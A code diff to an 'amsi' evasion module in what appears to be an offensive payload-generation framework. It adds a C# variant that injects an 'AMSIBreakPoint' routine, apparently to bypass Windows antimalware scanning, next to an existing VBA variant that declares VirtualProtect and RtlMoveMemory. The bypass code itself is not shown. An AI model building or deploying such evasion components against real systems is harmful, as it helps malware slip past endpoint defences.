@@ -1,3 +1,4 @@
+import uuid
 from core.evasions.Evasion import Evasion
 from core.engines.EvasionComponent import EvasionComponent
 from core.engines.DefineComponent import DefineComponent
@@ -8,6 +9,7 @@ from core.controlers.Module import Module
 class amsi(Evasion):
     def __init__(self, platform):
         super().__init__(platform)
+        self.uuid = uuid.uuid4().hex
 
     def translate(self):
         module = Module()
@@ -19,7 +21,7 @@ class amsi(Evasion):
                 EvasionComponent(code),
             ]
         
-        if self.platform == "windows_vba":
+        elif self.platform == "windows_vba":
             module.components = [
                 EvasionComponent("dop"),
                 DefineComponent(
@@ -29,6 +31,15 @@ Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any
 Private Declare PtrSafe Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)"""),
 
                 CodeComponent(code),
+            ]
+
+        elif self.platform == "windows_cs":
+            module.components = [
+                DefineComponent("using System.Reflection;\n"),
+                DefineComponent("using System.Runtime.InteropServices;\n"),
+                #DefineComponent(f"using AMSIBreakPoint{str(self.uuid)};\n"),
+                CodeComponent(code.replace("####UUID####",str(self.uuid))),
+                EvasionComponent(f"AMSIBreakPoint{str(self.uuid)}.Program.AddAMSIBreakPoint();")
             ]
         
         return module
